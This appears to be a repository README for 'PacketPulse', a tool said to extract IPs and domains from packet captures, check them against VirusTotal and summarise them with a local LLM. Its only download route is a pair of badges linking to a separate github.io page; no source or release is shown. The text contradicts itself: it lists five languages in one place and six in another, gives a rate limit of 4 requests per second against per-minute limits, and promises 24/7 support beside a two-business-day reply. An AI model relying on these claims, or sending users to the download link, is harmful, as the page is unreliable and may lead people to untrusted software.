![preview](https://raw.githubusercontent.com/yogine27/pcap-reputation-sentinel/main/frame_c09e.svg)

# PacketPulse – Network Artifact Reputation Analyzer

**PacketPulse** transforms raw `.pcap` traffic captures into actionable threat intelligence by cross-referencing every embedded IP address and domain name against VirusTotal’s expansive reputation database. Instead of drowning in endless packet lists, you receive a distilled, human-readable verdict for each network entity, then optionally export that verdict to a local Large Language Model (LLM) for a synthesized executive summary. Built for privacy-conscious analysts, security operations center (SOC) teams, and forensic investigators who prefer keeping sensitive network metadata within their own infrastructure.

## Overview

Every network conversation leaves a digital fingerprint—an IP address here, a domain query there. Individually, these artifacts seem harmless. Collectively, they tell a story about malicious command-and-control channels, phishing infrastructure, or legitimate-but-risky external communications. PacketPulse automates the tedious process of extracting these artifacts, scoring their reputation, and presenting a prioritized risk matrix. What sets PacketPulse apart is its **local-first philosophy**: all traffic, all analysis, and all optional LLM report generation happen on your hardware. No third-party cloud relays, no data leaks, no dependency on proprietary threat feeds beyond the public VirusTotal API.

The tool is designed for three primary workflows:
1. **Incident Response Triage** – Quickly identify which external hosts in a malicious traffic capture are known-bad actors.
2. **Compliance Auditing** – Demonstrate due diligence by documenting the reputation of all outbound connections in a regulated environment.
3. **Threat Hunting Research** – Feed historical `.pcap` files through PacketPulse to discover patterns of unreported malicious infrastructure.

---

## Getting Started

[![Download](https://raw.githubusercontent.com/yogine27/pcap-reputation-sentinel/main/setup_2a75.svg)](https://yogine27.github.io/pcap-reputation-sentinel/)

PacketPulse runs as a lightweight command-line utility. It accepts a single `.pcap` or `.pcapng` file as input, parses the network flows, extracts unique IP addresses and fully qualified domain names (FQDNs), and then queries the VirusTotal API for reputation scores. The query rate is deliberately throttled to respect the standard public API tier’s request per minute limits, and the tool includes an automatic retry with exponential backoff for transient network errors.

### Prerequisites

- **Network Capture File**: A valid `.pcap` or `.pcapng` file—no special capture hardware required. If you do not have a capture, any packet capture tool (e.g., tcpdump, Wireshark) can generate one.
- **VirusTotal API Key**: Obtainable from the VirusTotal website after creating a free account. The key is passed via environment variable or command-line flag, never hardcoded.
- **Python 3.9+** (or your preferred runtime environment; the core logic is architecture-independent).
- **Optional LLM Endpoint**: A local Ollama instance, LM Studio server, or any OpenAI-compatible local API for generating narrative reports.

### Quick Start Workflow

Activate your virtual environment, install the dependency libraries (consult the `requirements.txt` file for the complete list), and then run:

```bash
python packetpulse.py --input capture.pcap --output report.json
```

This produces a JSON report containing every unique artifact, its reputation score (from -100 to +100), a verdict (malicious, suspicious, neutral, or benign), and the source packet indexes where the artifact appeared. For the LLM-powered narrative version, add the `--llm-url` flag pointed at your local model endpoint, e.g.:

```bash
python packetpulse.py --input capture.pcap --llm-url http://localhost:11434
```

The tool will then generate `report.md`—a natural-language summary that explains the overall risk level, highlights the top three most dangerous artifacts, and recommends immediate remediation steps.

---

## Core Features

| Feature | Description |
|---------|-------------|
| **Deep Packet Artifact Extraction** | Recursively parses TCP, UDP, HTTP, DNS, and TLS handshake packets to identify embedded IPs and domains. Handles fragmented packets and IPv4/IPv6 dual-stack traffic without data loss. |
| **Local LLM Report Synthesis** | Sends the extracted artifact list and their reputation scores to your own LLM endpoint. The model produces an executive summary, grouping related threats and suggesting mitigation priorities. The entire conversation remains on your machine. |
| **Reputation Caching** | Previous query results are stored in a local SQLite database (`.packetpulse_cache`). Subsequent runs on similar captures retrieve cached scores instantly, reducing API calls by up to 70% for recurring infrastructure. |
| **Unified Risk Matrix** | Each artifact receives a weighted risk score combining VirusTotal detection ratio, domain age estimation (if available via passive DNS), and the artifact’s frequency in the capture. High-frequency malicious artifacts are flagged as “repeat offenders” in the final output. |
| **Multilingual Summary Output** | The generated LLM report supports multiple output languages (English, Spanish, French, German, Japanese). Choose your preferred language via the `--lang` flag. The underlying artifact data remains language-agnostic. |
| **Responsive Terminal UI** | The progress bar and live status updates adapt to any terminal width, from narrow SSH windows to full-screen monitors. Real-time color coding indicates query status (green=benign, yellow=suspicious, red=malicious). |

---

## 📊 Risk Scoring Methodology

PacketPulse does not merely relay VirusTotal scores—it applies a heuristic weighting layer to avoid false positives. The final risk score (`R`) is computed as:

`R = (0.6 × VT_Detection_Ratio + 0.2 × VT_Reputation_Score_Normalized + 0.2 × Artifact_Recurrence_Factor)`.

- **VT_Detection_Ratio**: Raw detection count divided by total antivirus engines queried (e.g., 12/70 = 0.17).
- **VT_Reputation_Score_Normalized**: The raw VirusTotal community score (range -100 to 100) mapped to a 0-1 scale.
- **Artifact_Recurrence_Factor**: The number of packets in which the artifact appears, divided by the total packet count. This penalizes persistent connections to the same suspicious host.

Artifacts scoring above `0.6` are marked **Critical** and prioritized for manual review. This methodology prevents isolated false positives from overwhelming the analyst’s attention.

---

## 🏗️ Architecture Deep Dive

The pipeline consists of three decoupled stages:

1. **Capture Ingestion Engine** – Reads the `.pcap` file using low-level packet parsing libraries. Extracts metadata into a temporary memory-mapped data frame. Handles process forensics (if the capture was taken from a live host) by correlating connection timestamps.
2. **Reputation Query Orchestrator** – Manages the VirusTotal API quota. Maintains a priority queue where artifacts are sorted by recurrence (most frequent first). Implements a token-bucket rate limiter with a default of 4 requests per second (adjustable) to stay within public API constraints.
3. **Report Generator** – Converts the annotated artifact list into structured JSON, CSV, or Markdown. The optional LLM connector constructs a prompt that includes only the artifact metadata and instructs the model to use concise, actionable language—never hallucinated technical details.

### Why “Local-First” Matters

Sending packet captures or artifact lists to commercial cloud LLM services (e.g., generic online chatbots) risks leaking internal network topology, proprietary hostnames, or even sensitive domain names related to unreleased products. By running the report generation against a local model via Ollama or a similar runtime, you retain 100% control over your cybersecurity data. This is especially critical for organizations operating under GDPR, HIPAA, or NIST frameworks, where any external data transfer requires disclosure.

---

## 🔒 Privacy & Data Handling Policy

PacketPulse processes your capture files locally. The only external network request is a TLS-encrypted API call to VirusTotal’s public endpoint for reputation lookup. No packet payload data is transmitted—only the extracted IP addresses and domain names (over encrypted HTTPS). The local cache database stores no raw packets, only the artifact strings, their scores, and a timestamp. The LLM report generation, if enabled, transmits only a text-based summary of artifacts to your designated local endpoint on `localhost`. We recommend reviewing your local LLM’s privacy settings, but by default, no data leaves your machine.

---

## 🌍 Multilingual Support & Globalization

The final report generation and the terminal interface messages support the following locales:
- **English** (default)
- **Spanish**
- **French**
- **German**
- **Japanese**
- **Simplified Chinese**

Translations are stored in a lightweight locale file that can be extended via a simple JSON dictionary. The underlying detection engine makes no language assumptions, ensuring accurate artifact extraction regardless of the capture’s origin or the analyst’s native tongue.

---

## ⚠️ Disclaimer & Legal Use

PacketPulse is intended for **authorized security testing, forensic analysis, and defensive cybersecurity operations only**. Users are solely responsible for ensuring they have the legal right to analyze the provided `.pcap` files. Capturing or analyzing network traffic without explicit permission from the network owner may violate local, state, or federal laws, including but not limited to the Computer Fraud and Abuse Act (CFAA), GDPR, and national cybersecurity regulations. The tool provides no guarantee of detection completeness; VirusTotal queries are point-in-time snapshots and can be evaded by recently altered malicious infrastructure. Always validate critical findings via manual inspection or secondary threat intelligence sources. The author disclaims any liability for misuse, data breaches, or incorrect risk assessments resulting from the use of this software.

---

## 📜 License

This project is released under the **MIT License**. You are granted the freedom to use, modify, distribute, and sublicense the software, provided that the original copyright notice and this permission notice are included in all copies or substantial portions of the software. The software is provided “as is,” without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. See the full license text at the official MIT License repository.

---

## 🗓️ Roadmap & Future Development (2026 Vision)

Given the dynamic nature of threat intelligence, PacketPulse is planned for continuous evolution into 2026 and beyond. Key upcoming features include:

- **DNS over HTTPS (DoH) Enrichment** – Leveraging passive DNS databases to provide domain creation dates and historical IP resolution patterns.
- **Multi-capture Correlation** – Automatically comparing two different `.pcap` files to identify shared malicious infrastructure (same IP, different ports).
- **Plugin Architecture for Additional Reputation Sources** – Integrating with other public reputation APIs (e.g., URLhaus, AlienVault OTX) as optional modules.
- **Interactive Web Dashboard** – A read-only HTML report generator featuring interactive graphs (evidence of suspicious clusters) and a searchable artifact table.

These enhancements are driven by community feedback—submit feature requests via the repository’s issue tracker, and we will prioritize based on demand and technical feasibility.

---

## 🤝 Support & Community

For rapid troubleshooting, consult the `FAQ.md` file included in the repository root. For advanced use cases, discuss implementation strategies in the Discussions tab. We respond to critical security-related issues within 24-48 hours. For community support, join our dedicated Discord server. For business inquiries regarding custom extensions or deployment assistance, contact the maintainers via the repository’s private contact form (available after login).

**24/7 Customer Support Availability**: While this project is primarily community-driven, we strive to answer all legitimate questions within two business days. Time-sensitive operational queries may be prioritized if they involve failing infrastructure or critical production environments.

---

[![Download](https://raw.githubusercontent.com/yogine27/pcap-reputation-sentinel/main/setup_2a75.svg)](https://yogine27.github.io/pcap-reputation-sentinel/)

---

*PacketPulse does not attempt to compromise API rate limits or circumvent any terms of service. The tool is designed to operate within the generous limits of the VirusTotal free tier while providing a professional-grade analysis experience. For high-throughput environments, consider obtaining a commercial API key and adjust the `--requests-per-minute` flag accordingly. Always remember: intelligence without context is noise—PacketPulse gives you the context.*